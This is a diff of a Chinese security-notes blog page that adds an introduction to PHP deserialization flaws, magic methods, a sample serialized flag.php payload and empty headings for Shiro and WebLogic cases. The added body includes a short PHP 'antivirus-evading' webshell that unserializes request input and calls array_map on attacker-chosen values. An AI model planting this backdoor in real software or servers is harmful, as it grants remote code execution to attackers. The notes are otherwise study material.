@@ -20,17 +20,17 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="简单的介绍了序列化和反序列化以及一些经典的案例">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反序列化漏洞">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="简单的介绍了序列化和反序列化以及一些经典的案例">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-21T08:50:09.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:50:09.339Z">
+<meta property="article:modified_time" content="2023-08-21T15:14:09.342Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="反序列化漏洞">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
@@ -222,11 +222,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:50:09" itemprop="dateCreated datePublished" datetime="2023-08-21T16:50:09+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:50:09 / 修改时间：23:14:09" itemprop="dateCreated datePublished" datetime="2023-08-21T16:50:09+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">简单的介绍了序列化和反序列化以及一些经典的案例</div>
 
         </div>
       </header>
@@ -237,7 +248,25 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h1 id="序列化和反序列化的定义"><a href="#序列化和反序列化的定义" class="headerlink" title="序列化和反序列化的定义:"></a>序列化和反序列化的定义:</h1><p>序列化 (serialize)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】</p>
+<p>反序列化就是再将这个状态信息拿出来使用。（重新再转化为对象或者其他的）【将字符串转化为状态信息】</p>
+<p>类比:<br>序列化: 游戏的存档 =&gt; 把游戏当前的状态保存下来<br>反序列化: 游戏的读档 =&gt; 通过存档的信息恢复游戏的状态<br>一般情况下：只有类会反序列化和序列化</p>
+<p>xxx::aaa()  =&gt;  类的方法（函数）; 类里面的函数，叫做方法<br>他去调用xxx类里的aaa()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反序列化免杀马：</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="title function_ invoke__">array_map</span>(<span class="variable">$this</span>-&gt;test,<span class="variable">$this</span>-&gt;aaa);&#125;&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>]);</span><br><span class="line">	<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure>
+<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>自动化运行方法 - 不需要写就自动会运行方法 - 魔术方法</p>
+<p>条件满足自动运行 // 不会关</p>
+<p>魔术方法 =&gt; 特殊的函数 =&gt; 满足条件自动运行的函数</p>
+<p>__wakeup :  unserialize就会调用</p>
+<p>__xxxxx()</p>
+<p>__toString</p>
+<p>​    当对象被当作字符串输出的时候<br>​    echo 只能字符串</p>
+<p>​    O:6:”readme”:1:{s:6:”source”;s:8:”flag.php”;}<br>​    反序列化需要的值</p>
+<p>​    foreach($todos as $todo)<br>​    遍历数组： $todos的东西依次放入$todo<br>​    <li><?=$todo?></li></p>
+<p>​    HTML + PHP </p>
+<p>​    <li></li> html 行标签</p>
+<p>​    &lt;?=$todo?&gt; PHP代码</p>
+<p>​    &lt;?=$todo?&gt;<br>​    =&gt;<br>​    &lt;?php echo $todo?&gt;</p>
+<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="Shiro反序列化漏洞"><a href="#Shiro反序列化漏洞" class="headerlink" title="Shiro反序列化漏洞"></a>Shiro反序列化漏洞</h2><h2 id="Weblogic反序列化漏洞"><a href="#Weblogic反序列化漏洞" class="headerlink" title="Weblogic反序列化漏洞"></a>Weblogic反序列化漏洞</h2>
     </div>
 
     
@@ -262,6 +291,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag"># 反序列化漏洞</a>
+          </div>
 
         
 
@@ -335,6 +367,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="nav-text">序列化和反序列化的定义:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">魔术方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B"><span class="nav-text">案例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">Shiro反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">Weblogic反序列化漏洞</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +390,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
